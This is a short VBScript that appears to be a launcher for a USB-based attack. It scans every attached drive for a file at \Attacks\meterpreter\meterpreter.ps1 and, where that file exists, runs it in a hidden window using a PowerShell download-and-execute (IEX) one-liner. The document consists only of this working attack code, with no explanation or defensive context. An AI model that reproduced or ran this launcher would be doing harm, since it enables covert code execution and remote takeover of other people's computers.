set script=CreateObject("wscript.shell")
Function FileExists(FilePath)
  Set fso = CreateObject("Scripting.FileSystemObject")
  If fso.FileExists(FilePath) Then
    FileExists=CBool(1)
  Else
    FileExists=CBool(0)
  End If
End Function

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set colDrives = objFSO.Drives

For Each objDrive in colDrives
    If FileExists (objDrive & "\Attacks\meterpreter\meterpreter.ps1") Then
	script.run "powershell IEX (New-Object Net.WebClient).DownloadString('file://" & objdrive & "\Attacks\meterpreter\meterpreter.ps1')", 0
         End If
Next